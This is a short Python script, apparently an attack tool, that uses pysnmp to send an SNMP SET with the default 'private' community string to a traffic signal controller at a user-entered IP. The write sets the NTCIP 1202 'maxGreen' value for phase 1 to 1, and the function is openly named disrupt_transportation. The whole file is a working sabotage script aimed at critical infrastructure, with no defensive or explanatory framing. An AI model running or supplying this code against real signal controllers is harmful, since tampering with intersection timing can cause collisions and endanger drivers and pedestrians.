from pysnmp.hlapi import *
import sys

def disrupt_transportation(target):
    errorIndication, errorStatus, errorIndex, varBinds = next(
        setCmd(SnmpEngine(),
               CommunityData('private', mpModel=0),
               UdpTransportTarget((target, 161)),
               ContextData(),
               ObjectType(ObjectIdentity('NTCIP1202-v01', 'maxGreen', 1), 1))
    )

    if errorIndication:
        print(errorIndication)
    elif errorStatus:
        print('%s at %s' % (errorStatus.prettyPrint(),
                            errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))
    else:
        for varBind in varBinds:
            print(' = '.join([x.prettyPrint() for x in varBind]))

def main():
    target = input("Enter target IP: ")
    disrupt_transportation(target)

if __name__ == "__main__":
    main()
